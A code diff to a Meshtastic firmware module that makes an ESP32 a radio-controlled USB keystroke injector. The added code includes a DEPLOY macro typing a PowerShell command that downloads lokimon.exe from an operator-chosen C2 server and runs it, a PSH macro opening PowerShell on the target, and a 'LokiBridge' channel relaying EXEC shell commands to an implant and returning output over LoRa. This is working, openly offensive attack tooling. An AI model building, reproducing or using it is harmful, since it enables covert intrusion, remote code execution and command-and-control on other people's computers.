@@ -7,46 +7,42 @@
 #include "tusb.h"  // For tud_mounted() to check USB host connection
 #endif
 
-// Global USB HID Keyboard object (like in working standalone project)
+// Global USB HID objects
 USBHIDKeyboard Keyboard;
+USBHIDVendor   VendorHID;
 
 HIDKeyboardModule *hidKeyboardModule;
 
 HIDKeyboardModule::HIDKeyboardModule() : MeshModule("HIDKeyboard")
 {
     LOG_DEBUG("HID Keyboard: Initializing HID at boot time");
-    
-    // Initialize HID at boot time (exactly like working standalone project)
-    // Initialize USB with HID only (like in working setup())
-    USB.begin();
-    
-    // Initialize USB HID Keyboard (like in working setup())
+
     Keyboard.begin();
-    
-    // Wait a moment for USB HID to initialize (like in working setup())
+    VendorHID.setRxBufferSize(4096);
+    VendorHID.begin();
+    USB.begin();
+
     delay(1000);
-    
-    LOG_DEBUG("HID Keyboard: USB HID Keyboard Ready!");
-    LOG_DEBUG("HID Keyboard: Soldered USB: HID Keyboard (GPIO 19/20)");
+
+    LOG_DEBUG("HID Keyboard: USB HID Keyboard + LokiBridge Ready!");
+    LOG_DEBUG("HID Keyboard: Soldered USB: HID Keyboard + Vendor HID (GPIO 19/20)");
     LOG_DEBUG("HID Keyboard: UART Serial: Communication port");
     LOG_DEBUG("HID Keyboard: Send LoRa messages to type on HID keyboard");
-    
+
     hidInitialized = true;
     hidReady = true;
-    
+
     LOG_DEBUG("HID Keyboard: HID ready for keystrokes at boot");
 }
 
 bool HIDKeyboardModule::wantPacket(const meshtastic_MeshPacket *p)
 {
-    // Only process text messages
     return p->decoded.portnum == meshtastic_PortNum_TEXT_MESSAGE_APP;
 }
 
 bool HIDKeyboardModule::init()
 {
     LOG_DEBUG("HID Keyboard: init() called - HID already initialized at boot");
-    // HID is already initialized in constructor
     return true;
 }
 
@@ -57,64 +53,54 @@ bool HIDKeyboardModule::isReady()
 
 bool HIDKeyboardModule::isHostConnected()
 {
-    // Check if USB host (PC) is actually connected and the device is enumerated
-    // For ESP32 with TinyUSB, use tud_mounted() to check if device is enumerated by host
-    #ifdef ARCH_ESP32
-        // tud_mounted() returns true when the USB device is enumerated by a host
-        // Note: This may return true even when connected to a hub without a PC,
-        // but it's the best available detection method for ESP32
-        return tud_mounted();
-    #else
-        // For other platforms, fall back to basic ready check
-        return isReady();
-    #endif
+#ifdef ARCH_ESP32
+    return tud_mounted();
+#else
+    return isReady();
+#endif
 }
 
+// ---------------------------------------------------------------------------
+// LoRa message handling
+// ---------------------------------------------------------------------------
 ProcessMessage HIDKeyboardModule::handleReceived(const meshtastic_MeshPacket &mp)
 {
     LOG_DEBUG("HID Keyboard: Message received");
-    
-    // HID is already initialized at boot, just check if ready
+
     if (!isReady()) {
         LOG_DEBUG("HID Keyboard: Not ready, skipping message");
         return ProcessMessage::CONTINUE;
     }
 
-    // Only process text messages
     if (mp.decoded.portnum != meshtastic_PortNum_TEXT_MESSAGE_APP) {
         LOG_DEBUG("HID Keyboard: Not a text message, skipping");
         return ProcessMessage::CONTINUE;
     }
 
-    // Check if this is a direct message (not a broadcast)
     bool isDirectMessage = isToUs(&mp);
     bool isBroadcastMessage = isBroadcast(mp.to);
-    
-    LOG_DEBUG("HID Keyboard: Message type - Direct: %d, Broadcast: %d, From: 0x%x, To: 0x%x", 
+
+    LOG_DEBUG("HID Keyboard: Message type - Direct: %d, Broadcast: %d, From: 0x%x, To: 0x%x",
               isDirectMessage, isBroadcastMessage, mp.from, mp.to);
-    
-    // Only process direct messages for security (ignore broadcasts)
+
     if (!isDirectMessage) {
         LOG_DEBUG("HID Keyboard: Not a direct message, ignoring");
         return ProcessMessage::CONTINUE;
     }
-    
-    // Extract message text
+
     String message = String((const char*)mp.decoded.payload.bytes, mp.decoded.payload.size);
     LOG_DEBUG("HID Keyboard: Received message: %s", message.c_str());
-    
-    // Check if message is "PING" and respond with "PONG"
+
     String messageUpper = message;
     messageUpper.toUpperCase();
     messageUpper.trim();
+
+    // PING — respond with PONG/NOPE
     if (messageUpper == "PING") {
-        // Only respond with PONG if HID is ready AND a USB host (PC) is actually connected
         bool hostConnected = isReady() && isHostConnected();
         const char *response = hostConnected ? "PONG" : "NOPE";
-        const char *logMsg = hostConnected ? "HID Keyboard: Received PING, host connected, sending PONG" 
-                                           : "HID Keyboard: Received PING but host not connected, sending NOPE";
-        LOG_DEBUG("%s", logMsg);
-        
+        LOG_DEBUG("HID Keyboard: Received PING, responding with %s", response);
+
         meshtastic_MeshPacket *p = router->allocForSending();
         p->to = getFrom(&mp);
         p->priority = meshtastic_MeshPacket_Priority_RELIABLE;
@@ -124,40 +110,345 @@ ProcessMessage HIDKeyboardModule::handleReceived(const meshtastic_MeshPacket &mp
         memcpy(p->decoded.payload.bytes, response, strlen(response));
         p->decoded.payload.size = strlen(response);
         service->sendToMesh(p);
-        
+
         return ProcessMessage::CONTINUE;
     }
-    
-    // Check if message is LoKey Script (starts with STRING, STRINGLN, ENTER, TAB, BACKSPACE, SPACE, LEFT, RIGHT, GUI, ALT, CTRL, or DELAY)
-    // Case-insensitive check for convenience
-    message.toUpperCase();
-    if (message.startsWith("STRING ") || message.startsWith("STRINGLN ") || 
-        message.startsWith("ENTER") || message.startsWith("TAB") || 
-        message.startsWith("BACKSPACE") || message.startsWith("SPACE") || 
-        message.startsWith("LEFT") || message.startsWith("RIGHT") || 
-        message.startsWith("GUI ") || message.startsWith("ALT ") || 
-        message.startsWith("CTRL ") || message.startsWith("DELAY ")) {
+
+    // EXEC <cmd> — send command to LokiMon via LokiBridge
+    if (messageUpper.startsWith("EXEC ")) {
+        String shellCmd = message.substring(5);
+        shellCmd.trim();
+        LOG_DEBUG("LokiBridge: EXEC command received over LoRa from 0x%x: %s", mp.from, shellCmd.c_str());
+        lokiBridgeSender = mp.from;
+        sendLokiBridgeCmd(shellCmd.c_str());
+        awaitingResponse = true;
+        LOG_DEBUG("LokiBridge: Command sent to LokiMon, awaiting response");
+        return ProcessMessage::CONTINUE;
+    }
+
+    // LBRESET — reset LokiBridge link (unconditionally returns to IDLE)
+    if (messageUpper == "LBRESET") {
+        LOG_DEBUG("LokiBridge: LBRESET command received over LoRa from 0x%x", mp.from);
+        chunkLen = 0;
+        chunkCount = 0;
+        messageInProgress = false;
+        awaitingResponse = false;
+        sendLokiBridgeReset();
+        LOG_DEBUG("LokiBridge: State cleared to IDLE, reset sent to LokiMon (best-effort)");
+
+        meshtastic_MeshPacket *p = router->allocForSending();
+        p->to = getFrom(&mp);
+        p->priority = meshtastic_MeshPacket_Priority_RELIABLE;
+        p->want_ack = false;
+        p->decoded.want_response = false;
+        p->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;
+        const char *response = "LB IDLE";
+        memcpy(p->decoded.payload.bytes, response, strlen(response));
+        p->decoded.payload.size = strlen(response);
+        service->sendToMesh(p);
+
+        return ProcessMessage::CONTINUE;
+    }
+
+    // LBSTATUS — report LokiBridge status back over LoRa
+    if (messageUpper == "LBSTATUS") {
+        LOG_DEBUG("LokiBridge: LBSTATUS command received over LoRa from 0x%x", mp.from);
+        String status = getLokiBridgeStatus();
+
+        meshtastic_MeshPacket *p = router->allocForSending();
+        p->to = getFrom(&mp);
+        p->priority = meshtastic_MeshPacket_Priority_RELIABLE;
+        p->want_ack = false;
+        p->decoded.want_response = false;
+        p->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;
+        memcpy(p->decoded.payload.bytes, status.c_str(), status.length());
+        p->decoded.payload.size = status.length();
+        service->sendToMesh(p);
+        LOG_DEBUG("LokiBridge: Status sent back over LoRa");
+
+        return ProcessMessage::CONTINUE;
+    }
+
+    // PSH — open PowerShell on target
+    if (messageUpper == "PSH") {
+        LOG_DEBUG("HID Keyboard: PSH macro received over LoRa from 0x%x", mp.from);
+        executePSH();
+        return ProcessMessage::CONTINUE;
+    }
+
+    // DEPLOY <c2-server> — download and run LokiMon
+    if (messageUpper.startsWith("DEPLOY ")) {
+        String c2Server = message.substring(7);
+        c2Server.trim();
+        LOG_DEBUG("HID Keyboard: DEPLOY macro received over LoRa from 0x%x, server: %s", mp.from, c2Server.c_str());
+        executeDeploy(c2Server);
+        return ProcessMessage::CONTINUE;
+    }
+
+    // LoKey Script commands (STRING, GUI, CTRL, etc.)
+    if (messageUpper.startsWith("STRING ") || messageUpper.startsWith("STRINGLN ") ||
+        messageUpper.startsWith("ENTER") || messageUpper.startsWith("TAB") ||
+        messageUpper.startsWith("BACKSPACE") || messageUpper.startsWith("SPACE") ||
+        messageUpper.startsWith("LEFT") || messageUpper.startsWith("RIGHT") ||
+        messageUpper.startsWith("GUI ") || messageUpper.startsWith("ALT ") ||
+        messageUpper.startsWith("CTRL ") || messageUpper.startsWith("DELAY ")) {
         LOG_DEBUG("HID Keyboard: Detected LoKey Script format");
-        // Reconstruct original message for execution (preserve case for text content)
         String originalMessage = String((const char*)mp.decoded.payload.bytes, mp.decoded.payload.size);
         executeLoKeyScript(originalMessage);
     } else {
-        // Not a LoKey Script command - ignore it (security: only explicit commands execute)
-        LOG_DEBUG("HID Keyboard: Not a LoKey Script command, ignoring message");
+        LOG_DEBUG("HID Keyboard: Not a recognized command, ignoring message");
     }
-    
+
     return ProcessMessage::CONTINUE;
 }
 
+// ---------------------------------------------------------------------------
+// LokiBridge: main loop polling
+// ---------------------------------------------------------------------------
+void HIDKeyboardModule::lokiBridgeLoop()
+{
+    handleSerialLokiBridge();
+
+    if (!awaitingResponse)
+        return;
+
+    while (VendorHID.available() >= (int)LB_REPORT_SIZE) {
+        uint8_t pollBuf[LB_REPORT_SIZE];
+        size_t n = VendorHID.read(pollBuf, LB_REPORT_SIZE);
+        if (n == LB_REPORT_SIZE) {
+            processLokiBridgeReport(pollBuf);
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
+// Serial command handling for LBSTATUS and LBRESET
+// ---------------------------------------------------------------------------
+void HIDKeyboardModule::handleSerialLokiBridge()
+{
+    while (Serial.available()) {
+        char c = Serial.read();
+        if (c == '\n' || c == '\r') {
+            if (cmdBufPos > 0) {
+                cmdBuf[cmdBufPos] = '\0';
+                String cmd = String(cmdBuf);
+                cmd.trim();
+                cmd.toUpperCase();
+
+                if (cmd == "LBSTATUS") {
+                    String status = getLokiBridgeStatus();
+                    Serial.printf("[LB] %s\n", status.c_str());
+                }
+                else if (cmd == "LBRESET") {
+                    Serial.println("[LB] Resetting LokiBridge link...");
+                    chunkLen = 0;
+                    chunkCount = 0;
+                    messageInProgress = false;
+                    awaitingResponse = false;
+                    sendLokiBridgeReset();
+                    Serial.println("[LB] State cleared to IDLE, reset sent to LokiMon (best-effort)");
+                }
+
+                cmdBufPos = 0;
+            }
+        } else if (cmdBufPos < CMD_BUF_SIZE - 1) {
+            cmdBuf[cmdBufPos++] = c;
+        }
+    }
+}
+
+// ---------------------------------------------------------------------------
+// LokiBridge: send a command to LokiMon
+// ---------------------------------------------------------------------------
+void HIDKeyboardModule::sendLokiBridgeCmd(const char *cmdStr)
+{
+    uint8_t pkt[LB_REPORT_SIZE] = {};
+    pkt[0] = LB_CTRL_SHORT;
+    size_t len = strlen(cmdStr);
+    if (len > LB_DATA_PER_REPORT) len = LB_DATA_PER_REPORT;
+    memcpy(&pkt[1], cmdStr, len);
+    VendorHID.write(pkt, LB_REPORT_SIZE);
+    LOG_DEBUG("LokiBridge: Sent command to LokiMon (%u bytes)", (unsigned)len);
+}
+
+// ---------------------------------------------------------------------------
+// LokiBridge: send a RESET to LokiMon
+// ---------------------------------------------------------------------------
+void HIDKeyboardModule::sendLokiBridgeReset()
+{
+    uint8_t pkt[LB_REPORT_SIZE] = {};
+    pkt[0] = LB_CTRL_RESET;
+    VendorHID.write(pkt, LB_REPORT_SIZE);
+    LOG_DEBUG("LokiBridge: Sent RESET to LokiMon");
+}
+
+// ---------------------------------------------------------------------------
+// LokiBridge: process one incoming 63-byte report from LokiMon
+// ---------------------------------------------------------------------------
+void HIDKeyboardModule::processLokiBridgeReport(const uint8_t *buf)
+{
+    uint8_t ctrl = buf[0];
+    const uint8_t *data = &buf[1];
+
+    switch (ctrl) {
+        case LB_CTRL_SHORT: {
+            size_t dataLen = LB_DATA_PER_REPORT;
+            while (dataLen > 0 && data[dataLen - 1] == 0) dataLen--;
+
+            if (dataLen > 0) {
+                chunkCount = 1;
+                memcpy(chunkBuf, data, dataLen);
+                chunkBuf[dataLen] = '\0';
+                LOG_DEBUG("LokiBridge: Short message received (%u bytes)", (unsigned)dataLen);
+                sendLoRaResponse((const char *)chunkBuf);
+            }
+            awaitingResponse = false;
+            messageInProgress = false;
+            chunkLen = 0;
+            break;
+        }
+
+        case LB_CTRL_START:
+            chunkLen = 0;
+            chunkCount = 0;
+            messageInProgress = true;
+            memcpy(chunkBuf + chunkLen, data, LB_DATA_PER_REPORT);
+            chunkLen += LB_DATA_PER_REPORT;
+            LOG_DEBUG("LokiBridge: Multi-chunk message started");
+            break;
+
+        case LB_CTRL_CONTINUE:
+            if (chunkLen + LB_DATA_PER_REPORT <= LB_CHUNK_MAX) {
+                memcpy(chunkBuf + chunkLen, data, LB_DATA_PER_REPORT);
+                chunkLen += LB_DATA_PER_REPORT;
+            }
+            break;
+
+        case LB_CTRL_CHUNK_BOUNDARY: {
+            size_t room = LB_CHUNK_MAX - chunkLen;
+            size_t copyLen = min(room, (size_t)LB_DATA_PER_REPORT);
+            if (copyLen > 0) {
+                memcpy(chunkBuf + chunkLen, data, copyLen);
+                chunkLen += copyLen;
+            }
+            flushChunk(false);
+            break;
+        }
+
+        case LB_CTRL_END: {
+            size_t room = LB_CHUNK_MAX - chunkLen;
+            size_t copyLen = min(room, (size_t)LB_DATA_PER_REPORT);
+            if (copyLen > 0) {
+                memcpy(chunkBuf + chunkLen, data, copyLen);
+                chunkLen += copyLen;
+            }
+            flushChunk(true);
+            break;
+        }
+
+        case LB_CTRL_RESET: {
+            size_t dataLen = LB_DATA_PER_REPORT;
+            while (dataLen > 0 && data[dataLen - 1] == 0) dataLen--;
+            chunkBuf[0] = '\0';
+            if (dataLen > 0) {
+                memcpy(chunkBuf, data, dataLen);
+                chunkBuf[dataLen] = '\0';
+            }
+            LOG_DEBUG("LokiBridge: RESET ACK received: %s", chunkBuf);
+            sendLoRaResponse("LBRESET ACK");
+            awaitingResponse = false;
+            messageInProgress = false;
+            chunkLen = 0;
+            chunkCount = 0;
+            break;
+        }
+
+        default:
+            LOG_WARN("LokiBridge: Unknown control byte: 0x%02X", ctrl);
+            break;
+    }
+}
+
+// ---------------------------------------------------------------------------
+// LokiBridge: flush reassembled chunk — send back over LoRa
+// ---------------------------------------------------------------------------
+void HIDKeyboardModule::flushChunk(bool isFinal)
+{
+    while (chunkLen > 0 && chunkBuf[chunkLen - 1] == 0) chunkLen--;
+
+    if (chunkLen > 0) {
+        chunkCount++;
+        chunkBuf[chunkLen] = '\0';
+        LOG_DEBUG("LokiBridge: Flushing chunk %d (%u bytes) to LoRa", chunkCount, (unsigned)chunkLen);
+        sendLoRaResponse((const char *)chunkBuf);
+    }
+
+    chunkLen = 0;
+
+    if (isFinal) {
+        LOG_DEBUG("LokiBridge: Message complete (%d chunks)", chunkCount);
+        awaitingResponse = false;
+        messageInProgress = false;
+        chunkCount = 0;
+    }
+}
+
+// ---------------------------------------------------------------------------
+// LokiBridge: send a text response back to the LoRa sender
+// ---------------------------------------------------------------------------
+void HIDKeyboardModule::sendLoRaResponse(const char *text)
+{
+    if (lokiBridgeSender == 0) {
+        LOG_WARN("LokiBridge: No sender to respond to");
+        return;
+    }
+
+    size_t len = strlen(text);
+    if (len > sizeof(((meshtastic_MeshPacket *)0)->decoded.payload.bytes)) {
+        LOG_WARN("LokiBridge: Response too large for single LoRa packet (%u bytes), truncating", (unsigned)len);
+        len = sizeof(((meshtastic_MeshPacket *)0)->decoded.payload.bytes);
+    }
+
+    LOG_DEBUG("LokiBridge: Sending response over LoRa to 0x%x (%u bytes)", lokiBridgeSender, (unsigned)len);
+
+    meshtastic_MeshPacket *p = router->allocForSending();
+    p->to = lokiBridgeSender;
+    p->priority = meshtastic_MeshPacket_Priority_RELIABLE;
+    p->want_ack = false;
+    p->decoded.want_response = false;
+    p->decoded.portnum = meshtastic_PortNum_TEXT_MESSAGE_APP;
+    memcpy(p->decoded.payload.bytes, text, len);
+    p->decoded.payload.size = len;
+    service->sendToMesh(p);
+
+    LOG_DEBUG("LokiBridge: Response sent over LoRa");
+}
+
+// ---------------------------------------------------------------------------
+// LokiBridge: status string
+// ---------------------------------------------------------------------------
+String HIDKeyboardModule::getLokiBridgeStatus()
+{
+    if (!awaitingResponse)
+        return String("LB IDLE");
+    if (messageInProgress)
+        return String("LB AWAIT IN_PROG");
+    return String("LB AWAIT");
+}
+
+// ---------------------------------------------------------------------------
+// Serial command handling for LBSTATUS and LBRESET
+// ---------------------------------------------------------------------------
+// Called from the serial console loop (main.cpp or SerialConsole)
+// This is checked in the main loop alongside lokiBridgeLoop()
+
+// ---------------------------------------------------------------------------
+// HID Keyboard: text and LoKey script execution
+// ---------------------------------------------------------------------------
 void HIDKeyboardModule::convertTextToKeystrokes(const String &text)
 {
     LOG_DEBUG("HID Keyboard: Converting text: %s", text.c_str());
-    
-    // Send the entire text string at once (like in working loop())
-    LOG_DEBUG("HID Keyboard: Sending text as keystrokes");
     Keyboard.print(text);
-    
-    // Add a delay to ensure all keystrokes are processed
     delay(300);
     LOG_DEBUG("HID Keyboard: Text sent as keystrokes");
 }
@@ -165,84 +456,73 @@ void HIDKeyboardModule::convertTextToKeystrokes(const String &text)
 void HIDKeyboardModule::executeLoKeyScript(const String &script)
 {
     LOG_DEBUG("HID Keyboard: Executing LoKey Script");
-    
-    // Parse script line by line (handle both single-line and multi-line)
+
     int startPos = 0;
-    while (startPos < script.length()) {
+    while (startPos < (int)script.length()) {
         int endPos = script.indexOf('\n', startPos);
         if (endPos == -1) {
             endPos = script.length();
         }
-        
+
         String line = script.substring(startPos, endPos);
-        line.trim(); // Remove leading/trailing whitespace
-        
+        line.trim();
+
         if (line.length() > 0) {
             LOG_DEBUG("HID Keyboard: Executing command: %s", line.c_str());
             executeLoKeyCommand(line);
-            delay(100); // Small delay between commands
+            delay(100);
         }
-        
+
         startPos = endPos + 1;
     }
-    
+
     LOG_DEBUG("HID Keyboard: LoKey Script execution complete");
 }
 
 void HIDKeyboardModule::executeLoKeyCommand(const String &command)
 {
-    // Convert to uppercase for case-insensitive command detection
     String commandUpper = command;
     commandUpper.toUpperCase();
-    
+
     if (commandUpper.startsWith("STRING ")) {
-        // STRING <text> - Type text
-        String text = command.substring(7); // Skip "STRING " (preserve original case for text)
+        String text = command.substring(7);
         LOG_DEBUG("HID Keyboard: STRING command: %s", text.c_str());
         Keyboard.print(text);
         delay(100);
     }
     else if (commandUpper.startsWith("STRINGLN ")) {
-        // STRINGLN <text> - Type text and press Enter
-        String text = command.substring(9); // Skip "STRINGLN " (preserve original case for text)
+        String text = command.substring(9);
         LOG_DEBUG("HID Keyboard: STRINGLN command: %s", text.c_str());
         Keyboard.print(text);
         delay(100);
         pressEnter();
     }
     else if (commandUpper == "ENTER") {
-        // ENTER - Press Enter key
         LOG_DEBUG("HID Keyboard: ENTER command");
         pressEnter();
     }
     else if (commandUpper == "TAB") {
-        // TAB - Press Tab key
         LOG_DEBUG("HID Keyboard: TAB command");
         pressTab();
     }
     else if (commandUpper == "BACKSPACE") {
-        // BACKSPACE - Press Backspace key
         LOG_DEBUG("HID Keyboard: BACKSPACE command");
         pressBackspace();
     }
     else if (commandUpper == "SPACE") {
-        // SPACE - Press Space key
         LOG_DEBUG("HID Keyboard: SPACE command");
         pressSpace();
     }
     else if (commandUpper == "LEFT") {
-        // LEFT - Press Left Arrow key
         LOG_DEBUG("HID Keyboard: LEFT command");
         pressLeft();
     }
     else if (commandUpper == "RIGHT") {
-        // RIGHT - Press Right Arrow key
         LOG_DEBUG("HID Keyboard: RIGHT command");
         pressRight();
     }
     else if (commandUpper.startsWith("GUI ")) {
-        // GUI <key> - Press Windows key + key
-        String key = command.substring(4); // Skip "GUI " (preserve original case for key)
+        String key = command.substring(4);
         key.trim();
         LOG_DEBUG("HID Keyboard: GUI command: %s", key.c_str());
         if (key.length() > 0) {
@@ -253,8 +533,7 @@ void HIDKeyboardModule::executeLoKeyCommand(const String &command)
         }
     }
     else if (commandUpper.startsWith("ALT ")) {
-        // ALT <key> - Press Alt key + key
-        String key = command.substring(4); // Skip "ALT " (preserve original case for key)
+        String key = command.substring(4);
         key.trim();
         LOG_DEBUG("HID Keyboard: ALT command: %s", key.c_str());
         if (key.length() > 0) {
@@ -265,8 +544,7 @@ void HIDKeyboardModule::executeLoKeyCommand(const String &command)
         }
     }
     else if (commandUpper.startsWith("CTRL SHIFT ")) {
-        // CTRL SHIFT <key> - Press Ctrl + Shift + key
-        String key = command.substring(11); // Skip "CTRL SHIFT " (preserve original case for key)
+        String key = command.substring(11);
         key.trim();
         LOG_DEBUG("HID Keyboard: CTRL SHIFT command: %s", key.c_str());
         if (key.length() > 0) {
@@ -277,8 +555,7 @@ void HIDKeyboardModule::executeLoKeyCommand(const String &command)
         }
     }
     else if (commandUpper.startsWith("CTRL ")) {
-        // CTRL <key> - Press Ctrl key + key
-        String key = command.substring(5); // Skip "CTRL " (preserve original case for key)
+        String key = command.substring(5);
         key.trim();
         LOG_DEBUG("HID Keyboard: CTRL command: %s", key.c_str());
         if (key.length() > 0) {
@@ -289,8 +566,7 @@ void HIDKeyboardModule::executeLoKeyCommand(const String &command)
         }
     }
     else if (commandUpper.startsWith("DELAY ")) {
-        // DELAY <milliseconds> - Wait for specified milliseconds
-        String delayStr = command.substring(6); // Skip "DELAY " (preserve original case)
+        String delayStr = command.substring(6);
         delayStr.trim();
         LOG_DEBUG("HID Keyboard: DELAY command: %s ms", delayStr.c_str());
         if (delayStr.length() > 0) {
@@ -312,33 +588,25 @@ uint8_t HIDKeyboardModule::stringToKeyCode(const String &key)
 {
     String keyLower = key;
     keyLower.toLowerCase();
-    
-    // Handle function keys F1-F12
+
     if (keyLower.startsWith("f")) {
         int fNum = keyLower.substring(1).toInt();
         if (fNum >= 1 && fNum <= 12) {
-            // F1 = 0x3A, F2 = 0x3B, ..., F12 = 0x45
             return (HID_KEY_F1 + fNum - 1);
         }
     }
-    
-    // Handle single character keys
+
     if (keyLower.length() == 1) {
         char c = keyLower.charAt(0);
-        
-        // For letters, they map directly (a-z = HID_KEY_A to HID_KEY_Z)
         if (c >= 'a' && c <= 'z') {
             return (HID_KEY_A + (c - 'a'));
         }
         else if (c >= '0' && c <= '9') {
-            // Numbers map to HID_KEY_0 to HID_KEY_9
-            // HID_KEY_0 = 0x27, HID_KEY_1 = 0x1E, HID_KEY_2 = 0x1F, ..., HID_KEY_9 = 0x26
             if (c == '0') return HID_KEY_0;
             return (HID_KEY_1 + (c - '1'));
         }
     }
-    
-    // Handle special key names
+
     if (keyLower == "enter" || keyLower == "return") return HID_KEY_ENTER;
     if (keyLower == "tab") return HID_KEY_TAB;
     if (keyLower == "space") return HID_KEY_SPACE;
@@ -349,60 +617,69 @@ uint8_t HIDKeyboardModule::stringToKeyCode(const String &key)
     if (keyLower == "down") return HID_KEY_ARROW_DOWN;
     if (keyLower == "left") return HID_KEY_ARROW_LEFT;
     if (keyLower == "right") return HID_KEY_ARROW_RIGHT;
-    
+
     LOG_DEBUG("HID Keyboard: Unknown key: %s", key.c_str());
-    return 0; // Invalid key code
+    return 0;
+}
+
+// ---------------------------------------------------------------------------
+// Macro: PSH — open a PowerShell prompt on the target
+// ---------------------------------------------------------------------------
+void HIDKeyboardModule::executePSH()
+{
+    LOG_DEBUG("HID Keyboard: Executing PSH macro");
+    pressKeyCombo(HID_KEY_GUI_LEFT, stringToKeyCode("r"));
+    delay(2000);
+    Keyboard.print("POWERSHELL.EXE");
+    delay(100);
+    pressEnter();
+    LOG_DEBUG("HID Keyboard: PSH macro complete");
+}
+
+// ---------------------------------------------------------------------------
+// Macro: DNLD — download and run LokiMon from a C2 server
+// ---------------------------------------------------------------------------
+void HIDKeyboardModule::executeDeploy(const String &c2Server)
+{
+    LOG_DEBUG("HID Keyboard: Executing DEPLOY macro, server: %s", c2Server.c_str());
+    String cmd = "$p=\"$env:TEMP\\lm.exe\"; Invoke-WebRequest -Uri http://";
+    cmd += c2Server;
+    cmd += "/lokimon.exe -OutFile $p; Start-Process $p";
+    Keyboard.print(cmd);
+    delay(100);
+    pressEnter();
+    LOG_DEBUG("HID Keyboard: DEPLOY macro complete");
 }
 
 void HIDKeyboardModule::pressKeyCombo(uint8_t modifier, uint8_t key)
 {
-    // Press modifier + key simultaneously, then release both
     LOG_DEBUG("HID Keyboard: Pressing key combo: modifier=0x%02X, key=0x%02X", modifier, key);
-    
-    // Use pressRaw for modifier keys to ensure they work correctly
     Keyboard.pressRaw(modifier);
-    delay(20); // Small delay to ensure modifier is registered
-    
-    // Press the key
+    delay(20);
     Keyboard.pressRaw(key);
-    delay(150); // Hold both keys for a moment
-    
-    // Release both
+    delay(150);
     Keyboard.releaseRaw(key);
     delay(20);
     Keyboard.releaseRaw(modifier);
-    
-    // Ensure all keys are released
     Keyboard.releaseAll();
     delay(100);
 }
 
 void HIDKeyboardModule::pressKeyComboMulti(uint8_t modifier1, uint8_t modifier2, uint8_t key)
 {
-    // Press two modifiers + key simultaneously, then release all
-    LOG_DEBUG("HID Keyboard: Pressing multi-key combo: modifier1=0x%02X, modifier2=0x%02X, key=0x%02X", 
+    LOG_DEBUG("HID Keyboard: Pressing multi-key combo: modifier1=0x%02X, modifier2=0x%02X, key=0x%02X",
               modifier1, modifier2, key);
-    
-    // Press first modifier
     Keyboard.pressRaw(modifier1);
-    delay(20); // Small delay to ensure modifier is registered
-    
-    // Press second modifier
+    delay(20);
     Keyboard.pressRaw(modifier2);
-    delay(20); // Small delay to ensure modifier is registered
-    
-    // Press the key
+    delay(20);
     Keyboard.pressRaw(key);
-    delay(150); // Hold all keys for a moment
-    
-    // Release all
+    delay(150);
     Keyboard.releaseRaw(key);
     delay(20);
     Keyboard.releaseRaw(modifier2);
     delay(20);
     Keyboard.releaseRaw(modifier1);
-    
-    // Ensure all keys are released
     Keyboard.releaseAll();
     delay(100);
 }
@@ -462,9 +739,6 @@ void HIDKeyboardModule::pressRight()
 }
 
 // Weak stubs for TinyUSB device class callbacks not used by HID keyboard.
-// The precompiled libarduino_tinyusb.a references these but the Arduino
-// core only provides implementations in source files that the linker
-// doesn't pull in when only HID is used.
 extern "C" {
 __attribute__((weak)) void tud_dfu_runtime_reboot_to_dfu_cb(void) {}
 __attribute__((weak)) uint32_t tud_dfu_get_timeout_cb(uint8_t /*alt*/, uint8_t /*state*/) { return 0; }
